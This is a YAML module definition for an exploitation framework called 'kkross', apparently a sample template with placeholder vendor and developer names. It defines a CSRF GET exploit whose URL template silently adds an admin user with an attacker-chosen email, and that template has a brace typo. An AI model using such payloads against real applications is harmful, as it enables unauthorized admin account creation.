---
# ** kkross module definition **
# Used for defining exploits, payloads, templates, etc

# Version of module structure, in order to enable future changes and compatibility determination
structure_version: 0
data:
  module_type: csrf_get
  name: foobar_app-add_user 
  description: Exploits lacking CSRF protection for the user add functionality

  metadata:
    # Arbitrary metadata for module (could be presented in interface/be searchable)
    vendor: Foobar Enterprises
    cve: ""
    affected_versions: 4.3.0 > 5.9.1
    fixed_in: 5.9.2
    links:
      - http://seclists.org/fulldisclosure/2016/Jun/20

    exploit_version: 1
    developers:
      - Test Testsson <test@example.com>
      - Beta Provberg <beta@example.com>

  # Settings that needs to be configured before module is added to crusade
  # Certain options may be inherited from type - such as "HOST", "PROTO" and "PORT"
  options:
    - name: EMAIL
      description: Desired e-mail address of added user
      option_type: string
      default: ""
      required: true

      # Specifies different types of limitations for the module option
      constraints:
        - constraint_type: length
          options:
            max: 25

  # Template for exploit redering (based on Jinja2)
  template: '{{ PROTO }}://{{ HOST }}:{{ PORT }/actions/adduser.php?role=admin&email={{ EMAIL | urlencode }}'
  
  # Template for generating instance ID of module (based on Jinja2)
  # Defines the unique name of configured module in instance, in order to allow multiple use
  instance_id: '{{ PROTO }}://{{ HOST }}:{{ PORT }} - E: {{ EMAIL }}'
